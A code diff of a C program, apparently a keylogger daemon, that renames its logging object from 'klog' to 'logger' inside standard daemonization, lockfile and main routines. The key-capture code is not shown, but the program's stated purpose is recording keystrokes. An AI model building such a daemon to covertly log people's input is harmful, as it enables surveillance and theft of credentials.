@@ -21,8 +21,8 @@
  */
 static void daemonize(void)
 {
-    klog.debug("Starting keylogger daemon...");
-    klog.debug(cmd_args->prog_name);
+    logger.debug("Starting keylogger daemon...");
+    logger.debug(cmd_args->prog_name);
 
     /*
      * Clear file creation mask and set it to a known value.
@@ -31,7 +31,7 @@ static void daemonize(void)
 
     prev_umask = umask(new_mask);
 
-    klog.debug("umask change: %03o -> %03o", prev_umask, new_mask);
+    logger.debug("umask change: %03o -> %03o", prev_umask, new_mask);
 
     /*
      * Get the maximum number of file descriptors.
@@ -59,12 +59,12 @@ static void daemonize(void)
      */
     pid_t pid;
 
-    klog.debug("Start [%d]", getpid());
+    logger.debug("Start [%d]", getpid());
 
     if ((pid = fork()) < 0) {
         err_quit("Cannot fork");
     } else if (pid != 0) { /* parent */
-        klog.debug("Parent [%d] closed (child [%d] lives on)", getpid(), pid);
+        logger.debug("Parent [%d] closed (child [%d] lives on)", getpid(), pid);
         exit(0);
     }
 
@@ -86,7 +86,7 @@ static void daemonize(void)
     if ((pid = fork()) < 0) {
         err_quit("Cannot fork");
     } else if (pid != 0) { /* parent */
-        klog.debug("Parent [%d] closed (child [%d] lives on)", getpid(), pid);
+        logger.debug("Parent [%d] closed (child [%d] lives on)", getpid(), pid);
         exit(0);
     }
 
@@ -108,7 +108,7 @@ static void daemonize(void)
         err_quit("Cannot change directory to %s", working_dir);
     }
 
-    klog.debug("Change working directory to %s", working_dir);
+    logger.debug("Change working directory to %s", working_dir);
 
     /*
      * Close all open file descriptors
@@ -134,7 +134,7 @@ static void daemonize(void)
         err_quit("Unexpected file descriptors: %d %d %d", fd0, fd1, fd2);
     }
 
-    klog.debug("File descriptors %d, %d, %d -> /dev/null", fd0, fd1, fd2);
+    logger.debug("File descriptors %d, %d, %d -> /dev/null", fd0, fd1, fd2);
 
     /* Daemon initialization is finished */
 }
@@ -152,7 +152,7 @@ static bool is_daemon_already_running(void)
     fd = open(LOCKFILE, oflag, mode);
 
     if (fd == ERROR) {
-        klog.error("Failed to open %s: %s", LOCKFILE, strerror(errno));
+        logger.error("Failed to open %s: %s", LOCKFILE, strerror(errno));
         return true;
     }
 
@@ -164,7 +164,7 @@ static bool is_daemon_already_running(void)
     };
 
     if (fcntl(fd, F_SETLK, &lockp) == ERROR) {
-        klog.error("Failed to lock %s: %s", LOCKFILE, strerror(errno));
+        logger.error("Failed to lock %s: %s", LOCKFILE, strerror(errno));
         return true;
     }
 
@@ -180,7 +180,7 @@ int main(int argc, char *argv[])
     cmd_args = parse_args(argc, argv);
 
     if (cmd_args) {
-        klog.open(cmd_args->prog_name);
+        logger.open(cmd_args->prog_name);
 
         daemonize();
 
@@ -190,8 +190,8 @@ int main(int argc, char *argv[])
 
         keyloggerd();
 
-        klog.info("Daemon finished");
-        klog.close();
+        logger.info("Daemon finished");
+        logger.close();
     }
 
     exit(0);
